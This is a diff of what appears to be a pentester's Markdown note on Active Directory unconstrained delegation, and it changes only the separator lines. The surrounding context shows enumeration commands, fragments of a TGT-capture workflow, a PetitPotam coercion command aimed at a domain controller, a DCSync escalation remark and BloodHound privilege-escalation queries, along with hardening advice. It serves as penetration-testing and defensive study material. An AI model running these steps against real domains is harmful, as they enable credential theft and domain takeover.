@@ -17,7 +17,7 @@ linked:
 ---
 # AD - Delegation Enumeration - Unconstrained Delegation
 
-***
+---
 
 ## Concept Overview
 
@@ -30,7 +30,7 @@ linked:
 | Mitigación primaria | Set `NOT_DELEGATED` UAC en Tier 0 + add a `Protected Users` group | Hardening. |
 ^ad-ud-concept
 
-___
+---
 
 ## Computer Objects with UD
 
@@ -49,7 +49,7 @@ Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties OperatingSys
   Select Name,DNSHostName,OperatingSystem,LastLogonDate,Description
 ```
 
-___
+---
 
 ## User Objects with UD (Rare)
 
@@ -62,7 +62,7 @@ ___
 
 **User-level UD = anomaly.** Casi nunca legítimo. Service accounts deberían usar Constrained o RBCD.
 
-___
+---
 
 ## TGT Capture Workflow
 
@@ -90,7 +90,7 @@ klist
 dir \\<DC>\C$
 ```
 
-___
+---
 
 ## Coercion + UD Chain
 
@@ -116,7 +116,7 @@ python3 PetitPotam.py -u corp/u -p pass <ud-host-IP> <DC-IP>
 # DC01$ tiene DCSync rights → DCSync vía PtT
 ```
 
-___
+---
 
 ## DCs (Default UD)
 
@@ -128,7 +128,7 @@ ___
 
 **DCs son UD default (PrimaryGroupID 516)** — comportamiento esperado para Kerberos delegation legítimo. Audit excluye DCs.
 
-___
+---
 
 ## Cross-Correlate Priv Tier
 
@@ -139,7 +139,7 @@ ___
 | `Get-ADComputer -Filter {TrustedForDelegation -eq $true} \| % { Get-NetSession -ComputerName $_.DNSHostName }` | Sessions activas en UD hosts | Targeted coercion. |
 ^ad-ud-tier
 
-___
+---
 
 ## BloodHound UD Visualization
 
@@ -151,7 +151,7 @@ ___
 | `MATCH p=shortestPath((u {owned:true})-[*1..]->(c:Computer {unconstraineddelegation:true})) RETURN p` | Path owned → UD host | Privesc planning. |
 ^ad-ud-bh
 
-___
+---
 
 ## Mitigations & Hardening
 
@@ -164,4 +164,4 @@ ___
 | GPO `Network access: Do not allow storage of passwords and credentials` | Block delegation system-wide | Per-OU. |
 ^ad-ud-mitigations
 
-***
+---
